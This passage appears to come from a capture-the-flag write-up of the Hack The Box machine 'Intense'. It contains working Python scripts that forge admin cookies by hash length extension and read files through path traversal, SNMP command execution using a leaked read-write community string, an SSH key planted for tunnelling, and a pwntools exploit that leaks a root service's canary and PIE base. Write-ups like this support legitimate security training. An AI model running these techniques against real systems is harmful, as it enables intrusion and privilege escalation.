The output gave me signatures and lengths for each secret length I suggested. Only one of these will work (the one that matches the actual secret length, which will change on box reset).

#### Script

Now seems like a good time to script this. The following Python script, which will:
- Login as guest with a POST request, and get the cookie.
- Break that cookie into the raw data and signature.
- Run `hash_extender` to get potential updated data / sig.
- Loop over the `hash_extender` output, trying each cookie, and checking the page to see if it’s logged in.

```

#!/usr/bin/env python3

import base64
import binascii
import requests
import subprocess

# Get Cookie
print("[*] Acquiring legit cookie as guest")
resp = requests.post(
    "http://10.10.10.195/postlogin",
    data={"username": "guest", "password": "guest"},
    headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
)
orig_cookie = resp.headers["Set-Cookie"].split("=", 1)[1]
cookie_data_b64, cookie_sig_b64 = orig_cookie.split(".")
cookie_data = base64.b64decode(cookie_data_b64).decode()
cookie_sig_hex = binascii.hexlify(base64.b64decode(cookie_sig_b64)).decode()
print("[+] Cookie acquired")

# Run hash extender
cmd = "/opt/hash_extender/hash_extender --secret-min 8 --secret-max 15 "
cmd += "--data username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec; "
cmd += f"--signature {cookie_sig_hex} -f sha256 --table "
cmd += "--append ;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"
hash_extender = subprocess.check_output(cmd.split(" ")).strip().decode().split("\n")
print("[*] Generated hash extensions for 8 to 15 byte secrets")

for test_hash in hash_extender:
    new_cookie_data = base64.b64encode(
        binascii.unhexlify(test_hash.split(" ")[-1])
    ).decode()
    new_cookie_sig = base64.b64encode(
        binascii.unhexlify(test_hash.split(" ")[-2])
    ).decode()
    new_cookie = f"{new_cookie_data}.{new_cookie_sig}"
    resp = requests.get("http://10.10.10.195/home", cookies=dict(auth=new_cookie),)
    if not "You can login with the username and password" in resp.text:
        print(f"[+] Identified working cookie from generated options!\n{new_cookie}")
        break

```

Running it presents the cookie that works:

```

root@kali# python3 cookie_forge.py
[*] Acquiring legit cookie as guest
[+] Cookie acquired
[*] Generated hash extensions for 8 to 15 byte secrets
[+] Identified working cookie from generated options!
dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.nnIFlYJwKuubEwHuT3Uft1abf4gyZrSgVutgI6RFuug=

```

Now I can put that cookie into my browser (either using a Firefox plugin, or just through the dev tools), and refresh the home page:

![image-20200708143258151](https://0xdfimages.gitlab.io/img/image-20200708143258151.png)

### /admin

#### Site

There is a new link at the top, Admin, that points to `/admin`. The page is pretty empty:

![image-20201111143313743](https://0xdfimages.gitlab.io/img/image-20201111143313743.png)

#### Source

Looking at the code, there are three routes:

```

@admin.route("/admin")
def admin_home():
    if not is_admin(request):
        abort(403)
    return render_template("admin.html")

@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''

@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''

```

The first one returns the template above. The other two accept POST requests to print files and and list directories.

These functions call `admin_view_log` and `admin_list_log`, both of which are imported from `utils`:

```

#### Logs functions ####
def admin_view_log(filename):
    if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()

def admin_list_log(logdir):
    if not path.exists(f"logs/{logdir}"):
        return f"Can't find {logdir}"
    return listdir(logdir)

```

Each starts but looking in the current directory in the `logs` directory, though there’s no protection against path traversal. I can list the current directory (interestingly, `.` doesn’t seem to be in the `logs` directory:

[![image-20200708144619578](https://0xdfimages.gitlab.io/img/image-20200708144619578.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200708144619578.png)

I can get file contents (this API does seem to start in the logs directory):

[![image-20200708144730694](https://0xdfimages.gitlab.io/img/image-20200708144730694.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200708144730694.png)

I can also get `user.txt`:

[![](https://0xdfimages.gitlab.io/img/image-20200708144834613.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200708144834613.png)

### Script

I got tired of using Repeater for enumeration, so I wrote a Python shell that will list directories and print files. It starts with the `cookie_brute.py` code from earlier, and uses that to get a valid cookie on startup. Then it provides a prompt where I can enter `ls` (or `dir`) and `cat` commands:

```

#!/usr/bin/env python3

import base64
import binascii
import requests
import subprocess
from cmd import Cmd

class Term(Cmd):

    prompt = "intense> "

    def __init__(self):
        Cmd.__init__(self)

        # Get Cookie
        resp = requests.post(
            "http://10.10.10.195/postlogin",
            data={"username": "guest", "password": "guest"},
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            },
        )
        orig_cookie = resp.headers["Set-Cookie"].split("=", 1)[1]
        cookie_data_b64, cookie_sig_b64 = orig_cookie.split(".")
        cookie_data = base64.b64decode(cookie_data_b64).decode()
        cookie_sig_hex = binascii.hexlify(base64.b64decode(cookie_sig_b64)).decode()
        print("[+] Guest Cookie acquired")

        # Run hash extender
        cmd = "/opt/hash_extender/hash_extender --secret-min 8 --secret-max 15 "
        cmd += "--data username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec; "
        cmd += f"--signature {cookie_sig_hex} -f sha256 --table "
        cmd += "--append ;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"
        hash_extender = (
            subprocess.check_output(cmd.split(" ")).strip().decode().split("\n")
        )
        print("[*] Generated hash extensions for 8 to 15 byte secrets")

        for test_hash in hash_extender:
            new_cookie_data = base64.b64encode(
                binascii.unhexlify(test_hash.split(" ")[-1])
            ).decode()
            new_cookie_sig = base64.b64encode(
                binascii.unhexlify(test_hash.split(" ")[-2])
            ).decode()
            new_cookie = f"{new_cookie_data}.{new_cookie_sig}"
            resp = requests.get(
                "http://10.10.10.195/home", cookies=dict(auth=new_cookie),
            )
            if not "You can login with the username and password" in resp.text:
                print(f"[+] Identified working cookie from generated options!")
                self.cookie = new_cookie
                break

    def do_ls(self, args):
        "Usage: ls [path relative to /]"
        resp = requests.post(
            "http://10.10.10.195/admin/log/dir",
            data={"logdir": f"../../../../../{args}"},
            cookies={"auth": self.cookie},
        )
        print(resp.text)

    def do_dir(self, args):
        "Usage: dir [path relative to /]"
        self.do_ls(args)

    def do_cat(self, args):
        "Usage: cat [file path relative to /]"
        resp = requests.post(
            "http://10.10.10.195/admin/log/view",
            data={"logfile": f"../../../../../{args}"},
            cookies={"auth": self.cookie},
        )
        print(resp.text)

    def precmd(self, args):
        if len(args.split(" ")) > 2:
            c = args.split(" ", 2)[0]
            args = f"help {c}"
        return args

term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()

```

## Shell as Debian-snmp

### Enumeration

After reading around for a while, I checked out the snmp configuration:

```

intense> ls /etc/snmp
['snmp.conf', 'snmpd.conf.TMP', 'snmpd.conf', 'snmpd.conf.dpkg-old']

```

At the top of the `snmpd.conf`, I see the two community strings:

```

intense> cat /etc/snmp/snmpd.conf                                                                                    
agentAddress  udp:161          
                                                                                                                     
view   systemonly  included   .1.3.6.1.2.1.1              
view   systemonly  included   .1.3.6.1.2.1.25.1                                                                      

 rocommunity public  default    -V systemonly  
 rwcommunity SuP3RPrivCom90
 ...[snip]...

```

With the second community string, I can do a lot more! I see how the first one is limited to the two MIBs above. So I can read the full SNMP. But this string is also read/write, which means I can fully interact with the host.

### Raw SNMP Execution

[This post](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e) gives a basic walkthrough of using `snmpwalk` and `snmpset` to run commands over SNMP. The spacing in this command is *super* finicky. This seems to work:

```

root@kali# snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90     10.10.10.195     'nsExtendStatus."command"'  = createAndGo     'nsExtendCommand."command"' = /bin/echo     'nsExtendArgs."command"'    = 'hello 0xdf'
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: hello 0xdf

```

I can get the output with `snmpwalk`:

```

root@kali# snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."command" = STRING: hello 0xdf

```

This is one a clean reset, so I suspect `test1` and `test2` were done by the box author and not cleared. `command` is the one that comes from my command above.

### SNMP Shell

The commands above are a pain - the line length is very limited, and the spacing is really annoying to get right. Fortunately, mxrch has a really cool [snmp-shell](https://github.com/mxrch/snmp-shell) on Github. Rather than do it manually, I can clone this, install dependencies, and then run it:

```

root@kali# rlwrap python3 /opt/snmp-shell/shell.py 10.10.10.195 -c SuP3RPrivCom90

Debian-snmp@intense:/$ id
uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)

```

It could be a bit quirky, but worked pretty well for the most part. I’m still limited by line length of commands.

## Priv: Debian-snmp –> root

### Enumeration

In `/home/user`, in addition to `user.txt`, there are two files, `note_server` and `note_server.c`. There is a service listening on localhost port 5001 (which matches what I’ll see in the source):

```

Debian-snmp@intense:/home/user$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN

```

And the binary is running as root:

```

Debian-snmp@intense:/home/user$ ps auxww | grep note
root       1120  0.0  0.0   4380   764 ?        Ss   08:45   0:00 /home/user/note_server

```

I copied the C code back to my host, and exfiled the binary as well, by `base64 -w0 note_server`, coping the output, and pasting it into a file on my local host. Then I decoded that into the binary, and checked the MD5 both locally and on Intense to ensure they matched.

### Tunnel

Given that I’m looking at binary exploitation, I’ll want a tunnel from my host to localhost:5001 on intense. I don’t have write permissions on `authorized_keys` for user:

```

Debian-snmp@intense:/home/user/.ssh$ ls -l
total 4
-rw-r--r-- 1 user user 396 Jun 30 09:38 authorized_keys

```

Looking at `/etc/passwd` for other users and their home directories, I see there’s already a `.ssh` folder in `/var/lib/snmp`:

```

Debian-snmp@intense:/var/lib/snmp/.ssh$ ls -l
total 4
-rw-r--r-- 1 Debian-snmp Debian-snmp 395 Jun 30 09:34 authorized_keys

Debian-snmp@intense:/var/lib/snmp/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNtKhCoK48OxTEZKg3x5/0yMhHyIzwx+t7rsdZzshAzkUNxPbEynYH8S1pjs3xmNQqDWUT6/Y0wZ1GGTxpwlwbN+Ln44uLAM/Z39Oi1qPE14JfsRCrv6pr2ywoPZzjOrcQKd7PB3Y77e74UIpLIv6uf25OG9qtYT5ZMqs3IVmxCSHa14HJbChc3338X8jAdLlAIIDG8ILrgQu6kjdRf7p4oR+xMkPZBA19me5i6XKcUs5WwQIINjsKnmUslidmBk87z36Y7rzRKib1JUVt0Rjbca3Km02HzYxpOTmWI1nC1R3/TsBZgLeoh7JgAF6bo44mY8NXO9iNaM5epsgEpyKD acid_creative

```

The shell doesn’t like long commands, but I can use a ed25519 key like the page suggests. I generated one with the command `ssh-keygen -o -a 100 -t ed25519 -f ~/keys/ed25519_gen -C "nobody@nothing"`. The public key is really short, but it still took two tries to get it to echo:

```

Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/' > /tmp/.t
Debian-snmp@intense:/var/lib/snmp/.ssh$ echo 'xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody' >> /tmp/.t
Debian-snmp@intense:/var/lib/snmp/.ssh$ cat /tmp/.t
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody
Debian-snmp@intense:/var/lib/snmp/.ssh$ cat /tmp/.t >> authorized_keys

```

This doesn’t allow me to get a shell over SSH:

```

root@kali# ssh -i ~/keys/ed25519_gen Debian-snmp@10.10.10.195
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 10 22:53:50 UTC 2020

  System load:  1.04              Processes:             175
  Usage of /:   6.1% of 39.12GB   Users logged in:       0
  Memory usage: 8%                IP address for ens160: 10.10.10.195
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

182 packages can be updated.
130 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jul 10 22:52:06 2020 from 10.10.14.42
Connection to 10.10.10.195 closed.

```

That’s because the shell for Debian-snmp is set to `/bin/false`:

```

Debian-snmp@intense:/var/lib/snmp/.ssh$ grep snmp /etc/passwd
Debian-snmp:x:111:113::/var/lib/snmp:/bin/false

```

But I don’t need a shell, just to tunnel. So I can use `-N` to not try to get a shell, and it just connects, and hangs open, creating the tunnel:

```

root@kali# ssh -i ~/keys/ed25519_gen Debian-snmp@10.10.10.195 -L 5001:localhost:5001 -N

```

### Interacting with note\_server

Just poking at the server, I couldn’t get anything back. `curl`, `nc`… it just didn’t send anything back. I checked my tunnel and it looked fine. So I turned to the source.

`main` is a standard while True loop that listens, receives connections, calls `fork`. The child process passes the file descriptor into `handle_client`, and closes when it returns. The parent process closes the connection and loops back to wait for more connections.

```

    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

        if (newsockfd < 0) {
            perror("ERROR on accept");
            exit(1);
        }

        /* Create child process */
        pid = fork();

        if (pid < 0) {
            perror("ERROR on fork");
            exit(1);
        }

        if (pid == 0) {
            /* This is the client process */
            close(sockfd);
            handle_client(newsockfd);
            exit(0);
        }
        else {
            close(newsockfd);
        }

    }

```

`handle_process` creates a bunch of variables, and then enters another while True loop. This time, it reads a single byte from the socket, and switches on that binary value:
1. “write note” - read another single byte, check that the current index plus this size doesn’t extend beyond the buffer size (exit if is does), and then write that many bytes from the socket to the buffer and increase the index.
2. “copy part of the note to the end of the note” - reads two bytes of offset (allowing to start anywhere in the 1024 byte buffer), checking that the offset is greater than 0 and less than the current index. It reads a single byte size to copy, which means it can only copy up to 255 bytes. It then checks that the current index is less than the buffer size, which is a mistake. It should be checking if the index plus size is greater than the buffer size. Then it calls `memcpy` to copy the given number of bytes from the given offset to the end of the note, and adds the copy number of bytes to the index.
3. “show note” - This writes `index` bytes from the buffer into the socket.

```

    while (1) {

        // get command ID
        if (read(sock, &cmd, 1) != 1) {
            exit(1);
        }

        switch(cmd) {
            // write note
            case 1:
                if (read(sock, &buf_size, 1) != 1) {
                    exit(1);
                }

                // prevent user to write over the buffer
                if (index + buf_size > BUFFER_SIZE) {
                    exit(1);
                }

                // write note
                if (read(sock, &note[index], buf_size) != buf_size) {
                    exit(1);
                }

                index += buf_size;

            break;

            // copy part of note to the end of the note
            case 2:
                // get offset from user want to copy
                if (read(sock, &offset, 2) != 2) {
                    exit(1);
                }

                // sanity check: offset must be > 0 and < index
                if (offset < 0 || offset > index) {
                    exit(1);
                }

                // get the size of the buffer we want to copy
                if (read(sock, &copy_size, 1) != 1) {
                    exit(1);
                }

                // prevent user to write over the buffer's note
                if (index > BUFFER_SIZE) {
                    exit(1);
                }

                // copy part of the buffer to the end 
                memcpy(&note[index], &note[offset], copy_size);

                index += copy_size;
            break;

            // show note
            case 3:
                write(sock, note, index);
            return;

        }
    }

```

It’s worth noting that both options 1 and 2 have `break` after them, exiting the `switch` and starting the `while` at the top. 3 does not, so once the buffer is printed once, it returns.

The code immediately explains why I couldn’t get any response from the server. I’d need to send a raw 0x01 followed by a size and some text, and then a 0x03 to get it to print. I can do that with `echo` and `nc`. This will send 1, 5, the string “test\n”, 3. And it prints back to me `test` with a newline:

```

root@kali# echo -en "\x01\x05test\n\x03" | nc 127.0.0.1 5001
test

```

### Python Functions

Doing this will `nc` and `echo` isn’t going to scale when I want to overwrite a 1024 byte buffer but can only do it 255 bytes per write. I started a Python script to interact with the binary:

```

#!/usr/bin/env python3

from pwn import *

def write_note(msg):
    if len(msg) > 255 or len(msg) == 0:
        print("Invalid message length")
        exit
    r.send(b"\x01" + p8(len(msg)) + msg.encode())

def copy_note(offset, size):
    r.send(b"\x02" + p16(offset) + p8(size))

def show_note():
    r.send(b"\x03")
    r.recvall()

r = remote("127.0.0.1", 5001) # either local binary or SSH tunnel to Intense

```

Now I can run `python3 -i pwn_note_server.py` and it will define these functions and the `-i` will drop to an interactive prompt once the script runs, giving access to the functions:

```

root@kali# python3 -i pwn_note_server.py 
[x] Opening connection to 127.0.0.1 on port 5001
[x] Opening connection to 127.0.0.1 on port 5001: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5001: Done
>>> write_note("test")
>>> show_note()
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 4B
[+] Receiving all data: Done (4B)
[*] Closed connection to 127.0.0.1 port 5001
b'test'

```

I can write a longer note:

```

root@kali# python3 -i pwn_note_server.py 
[x] Opening connection to 127.0.0.1 on port 5001
[x] Opening connection to 127.0.0.1 on port 5001: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5001: Done
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> show_note()
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 1020B
[+] Receiving all data: Done (1020B)
[*] Closed connection to 127.0.0.1 port 5001
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

```

That’s 1020 bytes. But if I go beyond 1024 with `write_note`, it just dies:

```

root@kali# python3 -i /tmp/pwn_note_server.py ERROR
[x] Opening connection to 127.0.0.1 on port 5001
[x] Opening connection to 127.0.0.1 on port 5001: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5001: Done
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> resp = show_note()
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/sock.py", line 65, in send_raw
    self.sock.sendall(data)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/tmp/pwn_note_server.py", line 18, in show_note
    r.send(b"\x03")
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py", line 754, in send
    self.send_raw(data)
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/sock.py", line 70, in send_raw
    raise EOFError
EOFError

```

### Identify Buffer Overflow

I already noticed this vulnerability when I was reviewing the source - I can write beyond 1024 with `copy_note`:

```

root@kali# python3 -i pwn_note_server.py ERROR
[x] Opening connection to 127.0.0.1 on port 5001
[x] Opening connection to 127.0.0.1 on port 5001: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5001: Done
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> write_note("A"*255)
>>> copy_note(0, 255)
>>> resp = show_note()
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 1.25KB
[+] Receiving all data: Done (1.25KB)
[*] Closed connection to 127.0.0.1 port 5001
>>> len(resp)
1275

```

When this runs, I get this error in the terminal where I’m running the local copy of the binary:

```
*** stack smashing detected ***: <unknown> terminated

```

The binary is using canaries to prevent buffer overflows.

### Protections

Now that I can do basic interaction with the program, and I can overflow the buffer, it’s time to look at what protections are in place:

```

root@kali# checksec note_server
[*] '/media/sf_CTFs/hackthebox/intense-10.10.10.195/note_server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

The answer is all of them.

RELRO means that the the global offset table (GOT) is filled in for all function at the start of execution, rather than as they are called for the first time, and then the table is set read only. This prevents attacks that overwrite functions in the GOT. I won’t need to write to GOT here (that’s more useful for things like heap exploits where I can change a pointer to write where I want).

Canary means that at the start of each function, a randomly generated token is put on the stack, before the return address, and then it is checked at the end to ensure it hasn’t changed. I’ll need a way to leak that to exploit this binary.

NX means that the stack is not executable, which is relatively standard. I can use return oriented programming (ROP) to avoid needing to execute from the stack.

PIE means that the main program is placed into a random position in memory on program start. This means that I can’t just get ROP gadgets from the main code from my machine, because they will be moving around on the remote host.

One thing that works in my favor here is that both the stack canaries and the NIE positions are set at start. So when the process forks to pass my connection into a child process, the main program location and the canary values are copied as well.

I can see from the SNMP shell that ASLR is enabled:

```

Debian-snmp@intense:/$ cat /proc/sys/kernel/randomize_va_space
2

```

This means I’ll need to leak the address of one of the LIBC functions if I want to use them.

### Identify Information Leak

I started looking for a way to leak the canary. In [rope](/2020/05/23/htb-rope.html#stage-0-brute-force-canary-and-rbp-and-return-address), I was able to brute force the canary by sending an overflow that went into just the first byte. I sent 256 different connections, and when one returned something (didn’t crash), I knew that was the next byte in the canary. Unfortunately, that won’t work here. When I pass a 3 to write the note, it prints the note, and then returns and exits. Since the crash would happen on the return, in both cases (correct and incorrect next byte), the output is the same.

Fortunately, there’s a second vulnerability in the copy function that is more subtle. The issue is that the program doesn’t check that the entire copy range is in already written space. It should check that `offset + copy_size < index` to ensure this. But since it doesn’t, I can do something like this:

```

root@kali# python3 -i /tmp/pwn_note_server.py ERROR
[x] Opening connection to 127.0.0.1 on port 5001
[x] Opening connection to 127.0.0.1 on port 5001: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5001: Done
>>> write_note('A'*200)
>>> write_note('A'*200)
>>> write_note('A'*200)
>>> write_note('A'*200)
>>> write_note('A'*200)
>>> write_note('A'*24)
>>> copy_note(1024, 32)
>>> resp = show_note()
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 1.06KB
[+] Receiving all data: Done (1.06KB)
[*] Closed connection to 127.0.0.1 port 5001
>>> stack = resp[1024:]
>>> for i in range(len(stack)//8):
...     print(f'{stack[i*8:(i*8)+8][::-1].hex()}')
... 
00007ffe862468a0
13d2ab240ecd5c00  <-- canary
00007ffe862468a0  <-- rbp for main
0000563e09322f54  <-- return to main

```

At the end there, I’m able to read the four words following the end of the buffer, which includes the canary, rbp, and the return address. The important thing to track here is the index. It starts at 0, and fills to 1024 with the six writes. Then the copy moves it beyond the data outside the buffer:

[![image-20200711162638352](https://0xdfimages.gitlab.io/img/image-20200711162638352.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200711162638352.png)

Now when the print options is selected, and Index is just after the return, it will send through that word.

### Stage 1: Leak Canary and Main Address

#### Offset Calculations

This leak solves not only the canary issue (since it doesn’t change between connections, I have it until the box resets), but also PIE, as I have the return address in main. I can attach `gdb` to the server and look at the memory regions:

```

root@kali# gdb -p $(pidof note_server)
...[snip]...
gdb-peda$ vmmap 
Start              End                Perm      Name
0x0000563e09322000 0x0000563e09324000 r-xp      /media/sf_CTFs/hackthebox/intense-10.10.10.195/note_server
0x0000563e09523000 0x0000563e09524000 r--p      /media/sf_CTFs/hackthebox/intense-10.10.10.195/note_server
0x0000563e09524000 0x0000563e09525000 rw-p      /media/sf_CTFs/hackthebox/intense-10.10.10.195/note_server
0x00007f76cb49d000 0x00007f76cb4c2000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007f76cb4c2000 0x00007f76cb60c000 r-xp      /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007f76cb60c000 0x00007f76cb656000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007f76cb656000 0x00007f76cb659000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007f76cb659000 0x00007f76cb65c000 rw-p      /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007f76cb65c000 0x00007f76cb662000 rw-p      mapped
0x00007f76cb67b000 0x00007f76cb67c000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007f76cb67c000 0x00007f76cb69a000 r-xp      /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007f76cb69a000 0x00007f76cb6a2000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007f76cb6a3000 0x00007f76cb6a4000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007f76cb6a4000 0x00007f76cb6a5000 rw-p      /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007f76cb6a5000 0x00007f76cb6a6000 rw-p      mapped
0x00007ffe86227000 0x00007ffe86248000 rw-p      [stack]
0x00007ffe86307000 0x00007ffe8630b000 r--p      [vvar]
0x00007ffe8630b000 0x00007ffe8630d000 r-xp      [vdso]

```

The return address into main is at 0x0000563e09322f54, and the main base address is at 0x0000563e09322000. I know know the offset from the return address to the start of the section:

```

gdb-peda$ p 0x0000563e09322f54 - 0x0000563e09322000
$1 = 0xf54

```

#### Python

Now I can write stage one of the exploit:

```

#!/usr/bin/env python3

import sys
from pwn import *

def write_note(msg):
    if len(msg) > 255 or len(msg) == 0:
        print("Invalid message length")
        exit
    r.send(b"\x01" + p8(len(msg)) + msg)

def copy_note(offset, size):
    r.send(b"\x02" + p16(offset) + p8(size))

def show_note():
    r.send(b"\x03")

# Stage 1 - Leak canary, main, and stack
log.info("Stage 1: Leak canary, main, and stack")
r = remote("127.0.0.1", 5001)
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 224)
copy_note(1024, 255)
show_note()
resp = r.recvall()
r.close()

canary = u64(resp[1032:1040])
log.success(f"Canary: 0x{canary:016x}")
main_rbp = u64(resp[1040:1048])
log.success(f"Main RBP: 0x{main_rbp:016x}")
main_ret = u64(resp[1048:1056])
log.success(f"Main return: 0x{main_ret:016x}")
main_base = main_ret - 0xF54
log.success(f"Main base: 0x{main_base:016x}")

```

It works:

```

root@kali# python3 pwn_note_server.py
[*] Stage 1: Leak canary, main, and stack
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (1.25KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] Canary: 0x13d2ab240ecd5c00
[+] Main RBP: 0x00007ffe862468a0
[+] Main return: 0x0000563e09322f54
[+] Main base: 0x0000563e09322000

```

### Stage 2: Leak LIBC

#### Offset Calculations

I still don’t have an address in LIBC to reference, and I won’t know where it is because of ASLR. But, now with the main program base, I can calculate the addresses in the PLT and GOT tables. I can use the PLT address for the `write` function to write something to my socket, and I’ll pass it the GOT address of `write`, which will give me the address in LIBC.

